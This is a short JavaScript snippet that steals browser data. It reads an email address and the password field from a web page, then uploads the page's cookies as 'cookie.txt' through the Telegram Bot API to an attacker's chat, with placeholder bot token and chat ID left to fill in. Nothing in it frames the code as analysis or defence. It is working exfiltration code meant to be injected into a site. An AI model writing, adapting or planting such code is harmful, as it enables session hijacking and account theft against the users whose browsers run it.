// Extract email and pass values
var email = document.querySelector('.sc-gwxIzh.jVmVMn').textContent.match(/\S+@\S+/)[0];
var pass = document.querySelector('input[type="password"]').value;

// Construct the URL for the Telegram Bot API
var botToken = 'YOUR_BOT_API_TOKEN';  // Replace with your Telegram Bot API token
var chatId = 'YOUR_CHAT_ID';  // Replace with the chat ID where the file will be sent
var url = `https://api.telegram.org/bot${botToken}/sendDocument`;

// Prepare the file (cookie.txt)
var formData = new FormData();
formData.append('chat_id', chatId);
formData.append('document', new Blob([document.cookie], {type: 'text/plain'}), 'cookie.txt');

// Send the GET request to send the file to Telegram bot
fetch(url, {
  method: 'POST',
  body: formData,
})
.then(response => response.json())
.then(data => {
  // Handle the response data here
  console.log(data);
})
.catch(error => {
  // Handle errors here
  console.error('Error:', error);
});
